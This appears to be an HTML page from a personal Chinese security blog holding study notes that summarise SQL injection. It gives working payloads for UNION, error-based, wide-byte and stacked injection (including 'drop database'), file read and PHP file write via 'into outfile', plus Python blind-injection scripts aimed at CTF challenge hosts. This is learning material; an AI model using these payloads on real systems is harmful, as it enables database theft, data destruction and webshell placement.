@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html  lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+    <script>
+    ;(function () {
+      const prefersDark =
+        window.matchMedia &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      const setting = localStorage.getItem('vueuse-color-scheme') || 'auto'
+      if (setting === 'dark' || (prefersDark && setting !== 'light'))
+        document.documentElement.classList.toggle('dark', true)
+    })()
+    </script>
+  <style type="text/css">
+    :root { color-scheme: light dark; --va-c-bg: #fff; }
+    html.dark { --va-c-bg: #000; }
+    html { background-color: var(--va-c-bg); }
+  </style><style id="valaxy-fouc">body{opacity:0!important}</style><style>body{transition:opacity .15s ease}</style><noscript><style>body{opacity:1!important}</style></noscript><script>(function foucGuardScript(maxDuration) {
+  var done = 0;
+  function reveal() {
+    if (done) return;
+    done = 1;
+    var s = document.getElementById("valaxy-fouc");
+    if (s) s.remove();
+  }
+  function check() {
+    var links = document.querySelectorAll('link[rel="stylesheet"]');
+    for (var i = 0; i < links.length; i++) {
+      if (!links[i].sheet) return;
+    }
+    reveal();
+  }
+  new MutationObserver(check).observe(document.head, {
+    childList: true,
+    attributes: true,
+    attributeFilter: ["media", "rel"]
+  });
+  addEventListener("load", reveal);
+  if (maxDuration)
+    setTimeout(reveal, maxDuration);
+})(5000)</script>
+    <script>
+    const locale = localStorage.getItem('valaxy-locale') || 'zh-CN';
+    document.documentElement.setAttribute('lang', locale);
+    </script>
+    
+  <script type="module" crossorigin src="/assets/index.DMmPyM9k.js"></script>
+  <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime.CPPQDwIl.js">
+  <link rel="modulepreload" crossorigin href="/assets/framework.DfD1zdSt.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-i18n.BSMUyWAh.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/@vueuse/motion.B1bNFY-Z.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/dayjs.Do72Hm6d.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/pinia.CMOAtTts.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-router.DZdD3Cav.js">
+  <link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/nprogress.CQax14yo.js">
+  <link rel="stylesheet" crossorigin href="/assets/style.BqWFzkuS.css">
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.BQhdFMY1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.DMm9YOAa.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.Dq_IR9rO.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.BEiXGLvX.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.Di6jR-x-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.CTRA-rTL.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.CL6g_b3V.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.BsDP51OF.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.CTYiF6lA.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.Dxdc4cR9.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Cx986IdX.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Jm3AIy58.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.DxDJ3AOS.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.SpSLRI95.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.NWA7e6Wa.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.BMLOBm91.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.B22Nviop.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.Dr94JaBh.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.CZnvNsCZ.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.iY-2wyZ7.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.t53AETM-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.DA0__PXp.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.D1sUS0GD.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.DbIhKOiC.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.C3H0VqGB.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.DN2j7dab.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.DDBCnlJ7.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.CS6fqUqJ.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D3wIWfF6.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D5yQViql.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.mCD8mA8B.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.C195tn64.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.Dy4dx90m.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.oD1tc_U0.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size3-Regular.CTq5MqoE.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.Dl5lxZxV.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.BF-4gkZK.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.CO6r4hn1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.C0xS9mPB.woff" as="font" type="font/woff" crossorigin>
+<link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+<link rel="preload" href="/assets/none.DLM1AMsD.jpg" as="image">
+<link rel="preload" href="/assets/bg-img.kXdNMxcF.jpg" as="image">
+<link rel="preload" href="/assets/sidebar-bg-img.mp54gEws.webp" as="image">
+<link rel="modulepreload" crossorigin href="/assets/sql注入总结.D8TnCPd3.js">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>sql注入总结 - 北沐城歌</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&display=swap">
+<meta property="og:locale:alternate" content="en">
+<meta name="description" content="山行野宿，孤身万里">
+<meta property="og:description" content="山行野宿，孤身万里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:site_name" content="北沐城歌">
+<meta property="og:title" content="sql注入总结">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kinsey973.github.io/">
+<link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg" type="image/svg+xml">
+<meta name="generator" content="Valaxy 0.28.7">
+<meta name="theme-color" content="#fff">
+<meta name="msapplication-TileColor" content="#fff">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+  <div id="app"><!--[--><!--[--><!--[--><!----><!----><div class="yun-page-header-gradient"></div><div class="yun-nav-menu z-$yun-z-nav-menu fixed bg-transparent" data-v-1791e522><div class="inline-flex justify-start items-center flex-1" data-v-1791e522><button type="button" class="vt-hamburger menu-btn sidebar-toggle leading-4 size-12 lg:hidden" aria-label="mobile navigation" aria-expanded="false" inline-flex cursor="pointer" hover="bg-white/80 dark:bg-black/80" z="$yun-z-menu-btn" data-v-1791e522><span class="vt-hamburger-container"><span class="vt-hamburger-top"></span><span class="vt-hamburger-middle"></span><span class="vt-hamburger-bottom"></span></span></button><a href="/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 data-v-1791e522><!--[--><div class="size-6 i-ri-home-4-line"></div><!--]--></a><div class="hidden lg:contents" data-v-1791e522><!--[--><a href="/posts/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 title="menu.posts" data-v-1791e522><!--[--><div class="size-6 i-ri-article-line"></div><!--]--></a><!--]--></div></div><div class="flex flex-1 flex-center" data-v-1791e522><div flex="~ center col h-full" class="nav-menu-title-container cursor-pointer" data-v-1791e522><!----><span class="font-light truncate">北沐城歌</span></div></div><div class="inline-flex-center justify-end items-center flex-1" data-v-1791e522><button class="yun-icon-btn rounded-none! hidden sm:inline-flex" title="切换语言" style="color:var(--va-c-text);" data-v-1791e522><div i-ri-translate class="transition transform"></div></button><button class="yun-icon-btn yun-toggle-dark rounded-none!" title="切换深色模式" data-v-1791e522><div i="ri-sun-line dark:ri-moon-line"></div></button><!--[--><button class="yun-search-btn yun-icon-btn popup-trigger rounded-none! size-12 inline-flex justify-center items-center" text="xl $va-c-text" title="搜索"><div i-ri-search-line op-80 hover="op-100"></div></button><!----><!--]--></div></div><!----><!----><!----><!--[--><div class="yun-bg"></div><!--]--><!----><a href="#" class="back-to-top yun-icon-btn bg-$va-c-bg-soft shadow-md"><div class="size-8" i-ri-arrow-up-s-line></div><svg class="progress-circle-container" viewBox="0 0 100 100"><circle stroke-dasharray="301.59289474462014 301.59289474462014" stroke-dashoffset="301.59289474462014" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="progress-circle" cx="50" cy="50" r="48" fill="none"></circle></svg></a><!--]--><!--[--><meting-js fixed="true" id="2049540645" server="netease" type="song" mini="true" mutex="false" listFolded="false" style=""></meting-js><!--]--><!----><!--]--><div class="min-h-screen flex flex-col"><div class="mt-12 md:mt-24 yun-layout-wrapper__content"><!--[--><div class="yun-layout-left gap-4 sticky top-$yun-margin-top w-80"><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden p-4 min-h-sm" flex="~ col gap-1" min-h="100px" bg="$va-c-bg-light"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><div class="site-info gap-1 items-center text-center" flex="~ col" p="t-8"><a href="/about" class="site-author-avatar inline-flex-center"><div class="relative yun-author-avatar"><div class="absolute size-full avatar-bg bg-image-$yun-home-hero-image-background-image filter-blur-2xl op-30"></div><img class="rounded-full size-full bg-white dark:bg-white/20 p-1 m-0 absolute" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png" alt="avatar"><span class="site-author-status absolute" title="The moonlight is beautiful.">💛</span></div></a><a href="/about" class="site-author-name font-black font-serif text-$va-c-text op-80 hover:op-100 flex-center">北歌</a><a href="/about/site" class="site-name text-lg leading-loose">北沐城歌</a><h4 class="site-subtitle block op-70" text="xs">北沐城歌|北歌的技术分享</h4><div class="site-description">山行野宿，孤身万里</div></div><div class="yun-gradient-line my-2 op-20"></div><nav class="site-nav" text-xl mt-2><a href="/archives/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="归档" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-archive-line"></div><div class="text-2xl icon-active i-ri-archive-fill"></div><span class="text-xs">归档</span></div><span class="count text-base text-black/80 dark:text-white/80">41</span></a><a href="/categories/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="分类" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-folder-2-line"></div><div class="text-2xl icon-active i-ri-folder-2-fill"></div><span class="text-xs">分类</span></div><span class="count text-base text-black/80 dark:text-white/80">6</span></a><a href="/tags/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="标签" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-price-tag-3-line"></div><div class="text-2xl icon-active i-ri-price-tag-3-fill"></div><span class="text-xs">标签</span></div><span class="count text-base text-black/80 dark:text-white/80">26</span></a></nav><div class="yun-gradient-line my-2 op-20"></div><div class="links-of-author"><!--[--><a class="links-of-author-item yun-icon-btn" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange;"><div class="i-ri-rss-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C;"><div class="i-ri-netease-cloud-music-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&amp;jump_from=webapi" title="QQ 2409101203" target="_blank" style="color:#12B7F5;"><div class="i-ri-qq-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494;"><div class="i-ri-github-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:white;"><div class="i-ri-train-line icon"></div></a><!--]--></div><div class="yun-gradient-line my-2 op-20"></div><div class="links flex-center"><!--[--><a href="/links/" class="va-link link-item yun-icon-btn" inline-flex title="网络世界的小伙伴们" style="color:hotpink;"><!--[--><div class="i-ri-open-arm-line icon size-6"></div><!--]--></a><a class="va-link link-item yun-icon-btn" inline-flex title="我的旧博客" style="color:#e16f00;" href="https://kinseyy.github.io/" target="_blank"><!--[--><div class="i-ri-quill-pen-line icon size-6"></div><!--]--><!----></a><a href="/categories/" class="va-link link-item yun-icon-btn" inline-flex title="分类" style="color:#f5f5f5;"><!--[--><div class="i-ri-apps-line icon size-6"></div><!--]--></a><a href="/tags/" class="va-link link-item yun-icon-btn" inline-flex title="标签" style="color:#f5f5f5;"><!--[--><div class="i-ri-bookmark-3-line icon size-6"></div><!--]--></a><!--]--></div><!--]--></div><!----></div><template></template><!--]--></div><main class="yun-main lt-md:w-full" flex="~ center"><!--[--><div class="content w-full md:w-3xl lg:w-2xl xl:w-2xl 2xl:w-4xl" flex="~ col grow" p="lt-md:0"><div class="yun-card flex-center rounded-2 overflow-hidden" flex="col" min-h="100px" bg="$va-c-bg-light" m="0"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><div class="mt-8 mb-4"><!--[--><header class="post-header"><h1 p="2" text="2xl center" font="serif black" style="color:" class="post-title flex-center"><!----><span inline-flex class="leading-none">sql注入总结</span></h1></header><!--]--></div><!--[--><!--[--><!--[--><!--[--><!----><div flex="~ center" text="sm" class="post-meta-col post-meta gap-4"><div class="post-time flex items-center gap-4"><span class="posted-time inline-flex-center gap-1" title="发表于2025-04-02 19:11:45"><div class="inline-block" i-ri-calendar-line></div><time class="op-80">2025-04-02</time></span><!----></div><!--[--><span id="busuanzi_container_page_pv"> 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span><!--]--><div class="inline-flex-center gap-4"><div class="inline-flex-center post-counter gap-4"><span class="word-count inline-flex-center gap-1" title="本文字数"><div class="inline-block" i-ri-file-word-line></div><span class="op-80">2.5k</span></span><span class="reading-time inline-flex-center gap-1" title="阅读时长"><div i-ri-timer-line></div><time class="op-80">10m</time></span></div><!----><!----></div></div><!--]--><!----><div class="inline-flex mt-2" text="sm" py="1"><a href="/categories?category=%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" class="transition post-category inline-flex-center text-xs border-$va-c-divider" px-2 h="7" border rounded-full hover="bg-blue-500 text-white"><div m="x-1" inline-flex i-ri-folder-2-line></div><span>学习笔记</span></a><span mx="2"></span><div class="post-tags inline-flex" items="center" gap="1" flex="wrap 1" justify="end"><!--[--><a href="/tags/?tag=sql%E6%B3%A8%E5%85%A5" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>sql注入</span></a><!--]--></div></div><!--]--><!--]--><!--]--><div p="x-4 b-8" class="sm:px-6 lg:px-12 xl:px-16" w="full"><!--[--><!--]--><!--[--><article class="markdown-body"><!--[--><!----><!----><!--[--><!--]--><!--[--><p>摘要：原理 sql注入发生原理： 用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库 注入类型 常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入… 基本操作 1.判断显示位 2.爆数据库的名。</p><p>&lt;!-- more --&gt;</p><h3 id="原理" tabindex="-1">原理 <a class="header-anchor" href="#原理" aria-label="Permalink to &quot;原理&quot;">​</a></h3><p>sql注入发生原理：</p><p>用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库</p><h4 id="注入类型" tabindex="-1">注入类型 <a class="header-anchor" href="#注入类型" aria-label="Permalink to &quot;注入类型&quot;">​</a></h4><p>常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入…</p><h3 id="基本操作" tabindex="-1">基本操作 <a class="header-anchor" href="#基本操作" aria-label="Permalink to &quot;基本操作&quot;">​</a></h3><p><strong>1.判断显示位</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?id=SELECT first name, last_name FROM users WHERE user_id = &#39;1&#39; union select 1,2,3#;
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>2.爆数据库的名字</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?id = &#39;1&#39; union select 1,user(),database()--+‘；
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>3.爆数据库中的表</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?id = &#39;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&#39;;
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>4.爆表中的字段</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?id= &#39;-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+&#39;，
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>5.爆相应字段的所有数据</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?id = &#39;-1&#39; union select 1,2,group_concat(user,password) from users--+&#39;;
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="盲注脚本" tabindex="-1">盲注脚本 <a class="header-anchor" href="#盲注脚本" aria-label="Permalink to &quot;盲注脚本&quot;">​</a></h3><h4 id="布尔盲注" tabindex="-1">布尔盲注 <a class="header-anchor" href="#布尔盲注" aria-label="Permalink to &quot;布尔盲注&quot;">​</a></h4><div class="language-py"><button title="Copy code" class="copy"></button><span class="lang">py</span><pre><code class="language-py">import requests
+if __name__ == &#39;__main__&#39; :
+    url = &#39;http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/&#39;
+    result = &#39;&#39;
+    i = 0
+    while True:
+        i = i + 1
+        low = 32
+        high = 127
+        while low &lt; high:
+            mid = (low + high) // 2
+            #payload = f&#39;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)%23&#39;
+            #payload = f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,0)%23&#39;
+            #payload = f&#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagba&quot;),{i},1))&gt;{mid},1,0)%23&#39;
+            payload = f&#39;if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))&gt;{mid},1,0)%23&#39;
+            # print(payload)
+            data={
+                &quot;uname&quot;:f&quot;admin&#39; and {payload}#&quot;,
+                &quot;passwd&quot;:12346
+            }
+            r = requests.post(url=url,data=data)
+            if &#39;flag.jpg&#39; in r.text:
+                low = mid + 1
+            else:
+                high = mid
+        if low != 32:
+            result += chr(low)
+        else:
+            break
+        print(result)
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="时间盲注" tabindex="-1">时间盲注 <a class="header-anchor" href="#时间盲注" aria-label="Permalink to &quot;时间盲注&quot;">​</a></h4><div class="language-py"><button title="Copy code" class="copy"></button><span class="lang">py</span><pre><code class="language-py">import requests
+import time
+if __name__ == &#39;__main__&#39; :
+    url = &#39;http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1&quot;%20and%20&#39;
+    result = &#39;&#39;
+    i = 0
+    while True:
+        i = i + 1
+        low = 32
+        high = 127
+        while low &lt; high:
+            mid = (low + high) // 2
+            #payload = f&#39;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,sleep(3))%23&#39;
+            #payload = f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,sleep(2))%23&#39;
+            #payload = f&#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),{i},1))&gt;{mid},1,sleep(2))%23&#39;
+            payload = f&#39;if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),{i},1))&gt;{mid},1,sleep(2))%23&#39;
+            # print(payload)
+            stime=time.time()
+            r = requests.get(url=url + payload)
+            if time.time()-stime&lt;2:
+                low = mid + 1
+            else:
+                high = mid
+        if low != 32:
+            result += chr(low)
+        else:
+            break
+        print(result)
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="注入类型-1" tabindex="-1">注入类型 <a class="header-anchor" href="#注入类型-1" aria-label="Permalink to &quot;注入类型&quot;">​</a></h3><h4 id="二次注入" tabindex="-1">二次注入 <a class="header-anchor" href="#二次注入" aria-label="Permalink to &quot;二次注入&quot;">​</a></h4><p>其产生原因是：服务器端虽然对用户的直接输入做了一些过滤或者将一些字符进行转义，但是对于已经存入数据库的信息是完全信任的，即：不校验数据库信息是否合法</p><p>利用场景主要有：靶机里同时存在注册和登录页面，且需要获得admin密码</p><h4 id="宽字节注入" tabindex="-1">宽字节注入 <a class="header-anchor" href="#宽字节注入" aria-label="Permalink to &quot;宽字节注入&quot;">​</a></h4><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作</p><p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。因此当我们输入’时，在php代码中如果有过滤的话会利用转义字符\进行转义，而利用urlencode表示的话，就为%5c%27，我们若想要将%5c去掉，则若此时mysql用的是GBK编码，则可以在前面加上一个编码如**%df**，使得系统认定%df%5c表示着一个汉字。</p><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre><code class="language-sql">?id=-1%df%27union select 1,2,group_concat(column_name)from information_schema.columns where table_name=%df&#39;users %df&#39;--+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="堆叠注入" tabindex="-1">堆叠注入 <a class="header-anchor" href="#堆叠注入" aria-label="Permalink to &quot;堆叠注入&quot;">​</a></h4><p>使用前提：堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如 <strong>mysqli_multi_query()</strong> 函数就支持多条SQL语句同时执行，而 mysqli_query() 函数就不支持。在实际应用中，大多数都使用的是 <strong>mysqli_query()</strong> 函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用 mysqli_query() 函数。</p><p>利用方式:在我们输入的语句后面加上分号表示该语句结束，之后再输入另一条语句就可以了。例如可以先写一个查询语句，之后加分号表示查询结束，再在分号后输入删除语句。这样就叫堆叠注入。</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?id=show database();drop database &lt;数据库名&gt;;
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="文件读取写入注入" tabindex="-1">文件读取写入注入 <a class="header-anchor" href="#文件读取写入注入" aria-label="Permalink to &quot;文件读取写入注入&quot;">​</a></h4><h5 id="文件读取" tabindex="-1">文件读取 <a class="header-anchor" href="#文件读取" aria-label="Permalink to &quot;文件读取&quot;">​</a></h5><p><code>union select 1,2,load_file(&#39;文件路径&#39;)</code></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>union select 1,2,load_file(&#39;D:/test.txt&#39;)
+?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)
+ （%20是换行，%27是引号，有路径时，防止转义可以将\改为\\或者/）
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h5 id="文件写入" tabindex="-1">文件写入 <a class="header-anchor" href="#文件写入" aria-label="Permalink to &quot;文件写入&quot;">​</a></h5><p><strong><code>union select 1,&#39;</code>&lt;?php phpinfo();?&gt;<code>&#39;,3 into outfile &#39;文件路径&#39; --+</code></strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &#39;E:\\phpStudy\\WWW\\sqli\\Less-7\\1.php&#39; --+
+此时就将 phpinfo() 的内容写入 E:\phpStudy\WWW\sqli\Less-7 路径下并创建一个1.php文件
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="报错注入" tabindex="-1">报错注入 <a class="header-anchor" href="#报错注入" aria-label="Permalink to &quot;报错注入&quot;">​</a></h4><p><strong>updatexml（）函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li></ul><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>爆出数据库
+1&#39; and updatexml(1,concat(0x7e,database(),0x7er),1)#
+
+爆当前数据库表信息
+1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
+
+爆user表字段信息
+1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39;),0x7e),1) #
+
+爆数据库内容、、
+1&#39; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
+</code></pre><button class="code-block-unfold-btn"></button></div><p>extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>爆出数据库
+1&#39; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #
+
+爆当前数据库表信息
+1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
+
+爆user表字段信息
+1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))) #
+
+爆数据库内容、、
+1&#39; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="handler命令注入" tabindex="-1">handler命令注入 <a class="header-anchor" href="#handler命令注入" aria-label="Permalink to &quot;handler命令注入&quot;">​</a></h3><div class="language-sql"><button title="Copy code" class="copy"></button><span class="lang">sql</span><pre><code class="language-sql">HANDLER tbl_name OPEN [ [AS] alias]
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT … ]
